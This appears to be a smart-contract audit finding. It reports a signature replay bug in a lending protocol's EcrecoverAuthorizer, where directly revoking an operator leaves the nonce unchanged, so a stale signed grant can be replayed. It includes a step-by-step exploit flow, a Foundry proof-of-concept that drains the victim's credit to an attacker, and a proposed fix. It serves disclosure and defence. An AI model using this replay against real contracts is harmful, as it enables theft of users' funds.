### Title
Stale Signed Authorization Replay After Direct Revocation Re-Grants Operator Access ‚Äî (`src/periphery/EcrecoverAuthorizer.sol`)

### Summary
`EcrecoverAuthorizer` maintains its own per-authorizer `nonce` that is only incremented when `EcrecoverAuthorizer.setIsAuthorized` is called. A direct call to `Midnight.setIsAuthorized` to revoke an operator does not touch this nonce. Therefore, any previously signed `Authorization{isAuthorized=true}` with a matching nonce and unexpired deadline remains replayable after the victim has revoked the operator directly, re-granting the operator full access to the victim's credit.

### Finding Description

**Code path and root cause:**

`EcrecoverAuthorizer.setIsAuthorized` enforces two replay-prevention checks: [1](#0-0) 

```
require(block.timestamp <= authorization.deadline, Expired());
require(authorization.nonce == nonce[authorization.authorizer]++, InvalidNonce());
```

The nonce lives exclusively in `EcrecoverAuthorizer`: [2](#0-1) 

`Midnight.setIsAuthorized` writes only to `Midnight`'s own `isAuthorized` mapping and emits an event ‚Äî it has no knowledge of, and makes no call into, `EcrecoverAuthorizer`: [3](#0-2) 

These two state machines are completely decoupled. A direct revocation on `Midnight` leaves `ecrecoverAuthorizer.nonce[victim]` unchanged.

**Exploit flow (attacker-controlled inputs):**

1. Victim calls `midnight.setIsAuthorized(ecrecoverAuthorizer, true, victim)` ‚Äî standard setup to enable signature-based authorization.
2. Victim signs `Authorization{authorizer=victim, authorized=operator, isAuthorized=true, nonce=0, deadline=now+1day}` and shares it with the operator (or it is observed on-chain/off-chain).
3. Victim later decides to revoke the operator and calls `midnight.setIsAuthorized(operator, false, victim)` directly. This sets `midnight.isAuthorized[victim][operator] = false`. `ecrecoverAuthorizer.nonce[victim]` remains `0`.
4. Attacker (or the operator itself) submits the old signed authorization to `ecrecoverAuthorizer.setIsAuthorized(auth, sig)`:
   - `block.timestamp <= deadline` ‚Üí passes (deadline not expired).
   - `authorization.nonce == nonce[victim]++` ‚Üí `0 == 0` ‚Üí passes; nonce incremented to 1.
   - Signature valid; `signer == victim` ‚Üí passes.
   - `EcrecoverAuthorizer` calls `midnight.setIsAuthorized(operator, true, victim)`.
   - `msg.sender` is `EcrecoverAuthorizer`, which is still authorized in Midnight ‚Üí passes.
   - `midnight.isAuthorized[victim][operator]` is set back to `true`.
5. Operator calls `midnight.withdraw(market, units, victim, attacker)`: [4](#0-3) 
   - `isAuthorized[victim][operator]` is now `true` ‚Üí authorization check passes.
   - Victim's credit is transferred to attacker.

**Why existing checks fail:**

The `InvalidNonce` check only prevents replay of a signature that was already consumed through `EcrecoverAuthorizer`. It does not account for the victim having taken an out-of-band revocation action directly on `Midnight`. There is no mechanism to invalidate pending signed authorizations without going through `EcrecoverAuthorizer` itself. [5](#0-4) 

### Impact Explanation

An operator whose access was explicitly revoked by the victim via `Midnight.setIsAuthorized` can have that access restored by replaying a previously signed (but not yet submitted) authorization. The operator can then call `withdraw`, `withdrawCollateral`, `repay`, `setConsumed`, or any other authorized entry point on behalf of the victim, draining the victim's credit or collateral. [6](#0-5) 

### Likelihood Explanation

**Preconditions:**
- Victim must have authorized `EcrecoverAuthorizer` in Midnight (common setup for any user of the signature flow).
- Victim must have signed an `Authorization{isAuthorized=true}` with a nonce that has not yet been consumed through `EcrecoverAuthorizer`.
- The signed message's deadline must not have expired.
- Victim must have revoked the operator via direct `Midnight.setIsAuthorized` rather than through `EcrecoverAuthorizer`.

This scenario is realistic: a user who grants access via a signed authorization and later revokes it directly (e.g., via a UI that calls `Midnight.setIsAuthorized` directly) would be vulnerable for the entire remaining lifetime of the signed message. The attacker only needs to have observed the original signed authorization (e.g., from a mempool submission that was front-run, or from off-chain sharing).

### Recommendation

Add an `invalidateNonce` function to `EcrecoverAuthorizer` that allows the authorizer (or anyone authorized by them in Midnight) to increment their nonce directly, invalidating all pending signed authorizations:

```solidity
function invalidateNonce(address authorizer) external {
    require(
        authorizer == msg.sender || IMidnight(MIDNIGHT).isAuthorized(authorizer, msg.sender),
        Unauthorized()
    );
    nonce[authorizer]++;
    emit NonceInvalidated(authorizer, nonce[authorizer]);
}
```

Additionally, document clearly that revoking an operator via `Midnight.setIsAuthorized` directly does **not** invalidate pending signed authorizations, and that users must call `EcrecoverAuthorizer.invalidateNonce` (or submit a revocation through `EcrecoverAuthorizer`) to fully invalidate them. [7](#0-6) 

### Proof of Concept

```solidity
// SPDX-License-Identifier: GPL-2.0-or-later
pragma solidity ^0.8.0;

import {BaseTest} from "./BaseTest.sol";
import {Authorization, Signature, EIP712_DOMAIN_TYPEHASH, AUTHORIZATION_TYPEHASH}
    from "../src/periphery/interfaces/IEcrecoverAuthorizer.sol";

contract StaleAuthReplayTest is BaseTest {
    function testStaleAuthReplayAfterDirectRevoke() public {
        address operator = makeAddr("operator");
        address attacker = makeAddr("attacker");
        uint256 units = 1000;

        // Setup: lender has credit in a market
        collateralize(market, borrower, units);
        setupMarket(market, units); // lender now has `units` credit

        // Step 1: victim (lender) authorizes EcrecoverAuthorizer in Midnight
        vm.prank(lender);
        midnight.setIsAuthorized(address(ecrecoverAuthorizer), true, lender);

        // Step 2: victim signs Authorization{isAuthorized=true, authorized=operator, nonce=0}
        Authorization memory auth = Authorization({
            authorizer: lender,
            authorized: operator,
            isAuthorized: true,
            nonce: 0,
            deadline: block.timestamp + 1 days
        });
        bytes32 structHash = keccak256(abi.encode(AUTHORIZATION_TYPEHASH, auth));
        bytes32 domainSep = keccak256(abi.encode(EIP712_DOMAIN_TYPEHASH, block.chainid, address(ecrecoverAuthorizer)));
        bytes32 digest = keccak256(bytes.concat("\x19\x01", domainSep, structHash));
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(privateKey[lender], digest);
        Signature memory sig = Signature({v: v, r: r, s: s});

        // Step 3: victim revokes operator DIRECTLY on Midnight (does not go through EcrecoverAuthorizer)
        vm.prank(lender);
        midnight.setIsAuthorized(operator, false, lender);

        // Sanity: operator is revoked, EcrecoverAuthorizer nonce is still 0
        assertEq(midnight.isAuthorized(lender, operator), false);
        assertEq(ecrecoverAuthorizer.nonce(lender), 0); // <-- nonce NOT incremented

        // Step 4: attacker replays the old signed authorization
        vm.prank(attacker);
        ecrecoverAuthorizer.setIsAuthorized(auth, sig); // should revert but does not

        // Operator is re-granted access
        assertEq(midnight.isAuthorized(lender, operator), true); // BUG: should be false

        // Step 5: operator drains victim's credit
        skip(99);
        deal(address(loanToken), borrower, units);
        vm.prank(borrower);
        midnight.repay(market, units, borrower, address(0), hex"");

        vm.prank(operator);
        midnight.withdraw(market, units, lender, attacker); // succeeds ‚Äî victim's funds stolen

        assertEq(loanToken.balanceOf(attacker), units); // attacker received victim's funds
    }
}
```

**Expected assertions (all pass, demonstrating the bug):**
- `ecrecoverAuthorizer.nonce(lender) == 0` after direct revocation on Midnight.
- `midnight.isAuthorized(lender, operator) == true` after replay.
- `loanToken.balanceOf(attacker) == units` after operator withdraws.

contract EcrecoverAuthorizer is IEcrecoverAuthorizer {
    address public immutable MIDNIGHT;
    mapping(address => uint256) public nonce;

    constructor(address _midnight) {
        MIDNIGHT = _midnight;
    }

    function setIsAuthorized(Authorization memory authorization, Signature calldata signature) external {
        require(block.timestamp <= authorization.deadline, Expired());
        require(authorization.nonce == nonce[authorization.authorizer]++, InvalidNonce());

        bytes32 hashStruct = keccak256(abi.encode(AUTHORIZATION_TYPEHASH, authorization));
        bytes32 domainSeparator = keccak256(abi.encode(EIP712_DOMAIN_TYPEHASH, block.chainid, address(this)));
        bytes32 digest = keccak256(bytes.concat("\x19\x01", domainSeparator, hashStruct));
        address signer = ecrecover(digest, signature.v, signature.r, signature.s);
        require(signer != address(0), InvalidSignature());
        require(
            signer == authorization.authorizer || IMidnight(MIDNIGHT).isAuthorized(authorization.authorizer, signer),
            Unauthorized()
        );

        emit SetIsAuthorized(
            msg.sender,
            authorization.authorizer,
            authorization.authorized,
            authorization.isAuthorized,
            authorization.nonce
        );

        IMidnight(MIDNIGHT)
            .setIsAuthorized(authorization.authorized, authorization.isAuthorized, authorization.authorizer);
    }
